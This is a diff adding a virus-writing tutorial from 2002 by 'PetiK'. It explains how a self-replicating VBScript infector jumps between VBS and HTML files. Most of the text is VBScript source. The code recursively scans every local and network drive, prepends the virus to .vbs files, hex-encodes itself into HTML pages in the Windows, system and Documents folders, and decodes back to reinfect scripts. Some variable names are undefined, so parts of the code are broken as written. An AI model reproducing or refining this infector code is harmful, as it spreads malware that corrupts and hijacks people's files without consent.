@@ -1,0 +1,287 @@
+
+            === VBS/HTML multi-infection ===
+                === by PetiK (06/19/2002) ====
+
+
+################
+# Introducion: #
+################
+
+This article present how to travel between VBS and HTML file to infect them.
+There are 4 chapters :    I: VBS -> VBS
+             II: VBS -> HTML
+            III: HTML-> HTML
+             IV: HTML-> VBS
+
+
+#################
+# I: VBS -> VBS #
+#################
+
+We can frequently see this in the VBS virus. There are two sort of infection:
+
+-Overwritting : % To bad, the user sees immediatly the problem
+        % Crash the VBS file
+        So this solution is not very good.
+
+-Parasit :  % Start of the file :
+
+        **********************
+        * 'mark of the virus *
+        *                    *
+        *          +         *
+        *                    *
+        *  VBS virus         *
+        **********************
+        *                    *
+        *  Real VBS prog     *
+        *                    *
+        **********************
+
+        % End of the file :
+
+        **********************
+        * 'mark of the virus *
+        **********************
+        *                    *
+        *  Real VBS prog     *
+        *                    *
+        **********************
+        *                    *
+        *  VBS virus         *
+        *                    *
+        **********************
+        
+So we're going to see the code :
+
+'mark
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set ws = CreateObject("WScript.Shell")
+
+Set fl = fso.OpenTextFile(WScript.ScriptFullName, 1)
+virus = fl.ReadAll                          ' Stock the virus code
+fl.Close
+
+infectfile()
+Sub infectfile()
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set drv = fso.Drives
+For Each d In drv                           ' Get the drive
+If d.DriveType = 2 Or d.DriveType = 3 Then
+list(d.path&"\")
+End If
+Next
+End Sub
+
+Sub list(doss)
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set fold = fso.GetFolder(doss)
+Set yebjp = fold.SubFolders
+For Each f1 In yebjp                            ' Get the folder
+infect(f1.Path)
+list(f1.Path)
+Next
+End Sub
+
+Sub infect(doss)
+On Error Resume Next
+Set zqhanx = CreateObject("Scripting.FileSystemObject")
+Set lxxj = zqhanx.GetFolder(doss)
+Set fc = lxxj.Files
+For Each f1 In fc                           ' Get the files
+ext = fso.GetExtensionName(f1.Path)
+ext = lCase(ext)
+If (ext = "vbs") Then
+    Set cot = fso.OpenTextFile(f1.Path, 1, False)
+    If cot.ReadLine <> "'mark" Then                 ' check is already infected
+    cot.Close
+    Set cot = fso.OpenTextFile(f1.Path, 1, False)
+    vbsorg = cot.ReadAll()
+    cot.Close
+    Set inf = fso.OpenTextFile(f1.Path, 2, True)
+    inf.WriteLine virus                         ' write virus code
+    inf.WriteLine ""
+    inf.WriteLine (vbsorg)                      ' write real code
+    inf.Close
+    End If
+End If
+Next
+End Sub
+
+
+###################
+# II: VBS -> HTML #
+###################
+
+So, the idea is to put the viral code into the VBS file. How ?? by converting into hex string :
+
+....
+
+....
+
+If (ext = "htm") or (ext = "html") Then
+    Set cot = fso.OpenTextFile(f1.Path, 1, False)
+    If InStr(1,cot.ReadAll(),"vbshex") = 0 Then             ' check is already infected
+    cot.Close
+    Set htmf = fso.OpenTextFile(f1.Path, 8, False)
+    htmf.WriteLine "<SCRIPT LANGUAGE=VBSCRIPT>"
+    f = "vbshex="""
+
+    For i = 1 to Len(virus)                     ' take all char
+    e=Mid(virus,i,1)
+    e=Hex(Asc(e))                           ' and convert in hex
+
+    If Len(e)=1 Then
+    e="0"&e                             'DA -> 0D0A for VbCrLf
+    End If
+
+    f=f+e
+
+    Next
+
+    f=f+""""
+
+    ......  NO FINISH, SEE THE fourth chapter           ' Here the infection HTML -> VBS
+
+    htmf.WriteLine f
+    htmf.Close
+    End If
+End If
+
+Set htmf = fso.CreateTextFile("hello.htm",8,-2)
+htmf.WriteLine "<SCRIPT LANGUAGE=VBSCRIPT>"
+
+f = "vbshex="""
+
+For i = 1 to Len(virus)
+
+e=Mid(virus,i,1)
+e=Hex(Asc(e))
+
+If Len(e)=1 Then
+e="0"&e
+End If
+
+f=f+e
+
+Next
+
+f=f+""""
+
+htmf.WriteLine f
+htmf.Close
+
+
+#####################
+# III: HTML -> HTML #
+#####################
+
+It's a simple routine. Like in VBS (and it's in VBS).
+
+This a part of source :
+
+<mark>                                  ' the mark
+<html><head><title>You're title</title></head><body>
+<script language=VBScript>
+On Error Resume Next
+Set fso=CreateObject("Scripting.FileSystemObject")
+Set ws=CreateObject("WScript.Shell")
+If err.number=429 Then                          ' err number if user click NO
+ws.Run javascript:location.reload()
+Else
+
+infhtm(uplobu.GetSpecialFolder(0))                  ' call the infhtm function
+infhtm(uplobu.GetSpecialFolder(1))                  ' in specific folder (better)
+infhtm(unlgeu.SpecialFolders("MyDocuments"))
+
+End If
+
+Function infhtm(dir)
+If fso.FolderExists(dir) Then
+Set ibamih=fso.GetFolder(dir)
+Set vtob=ibamih.Files
+For each f1 in vtob
+ext=lcase(uplobu.GetExtensionName(f1.Name))
+
+If ext="htm" or ext="html" Then                     ' check extension
+Set eqybwx=fso.OpenTextFile(djra.path, 1, False)
+If eqybwx.ReadLine <> "<mark>" Then                 ' already infected ??
+    eqybwx.Close()
+    Set eqybwx=fso.OpenTextFile(djra.path, 1, False)
+    htmorg=eqybwx.ReadAll()
+    eqybwx.Close()
+    Set virushtm=document.body.CreateTextRange
+    Set eqybwx=fso.CreateTextFile(djra.path, True, False)
+    eqybwx.WriteLine "<mark>"                   ' put the mark
+    eqybwx.Write(htmorg)                        ' put the real code
+    eqybwx.WriteLine virushtm.htmltext              ' put te htm virus
+    eqybwx.Close()
+Else
+    eqybwx.Close()
+End If
+
+End If
+Next
+End If
+End Function
+
+</script></body></html>
+
+really simple no ??
+
+
+###################
+# IV: VBS -> HTML #
+###################
+
+So this is the the last part.
+
+Look at the second part, I write
+
+    ......  NO FINISH, SEE THE fourth chapter           ' Here the infection HTML -> VBS
+
+We must search here the VBS file. The same way that we infect HTM/HTML file.
+
+In the HTML virus we have :
+
+If ext="htm" or ext="html" Then
+
+So we add
+
+ElseIf ext="vbs" Then
+    Set cot = fso.OpenTextFile(f1.Path, 1, False)
+    If cot.ReadLine <> "'mark" Then                 ' check is already infected
+    cot.Close
+    Set cot = fso.OpenTextFile(f1.Path, 1, False)
+    vbsorg = cot.ReadAll()
+    cot.Close
+
+----------- here we infect the VBS file -----------
+
+    For Y=1 To Len(vbshex) Step 2
+      virvbs = virvbs & Chr("&H" & Mid(vbshex,Y,2))
+    Next
+    Set inf = fso.OpenTextFile(f1.Path, 2, True)
+    inf.Write virvbs                        ' write virus code
+    inf.WriteLine ""
+    inf.WriteLine (vbsorg)                      ' write real code
+    inf.Close
+
+----------- here we infect the VBS file -----------
+
+    End If
+
+
+
+###################
+# V: CONCLUSION : #
+###################
+
+This is the end of the article. If you have some suggestions or new ideas, please mail me to 
+petikvx@aol.fr.
+
+                            PetiK/[b8] (www.petikvx.fr.fm)
+
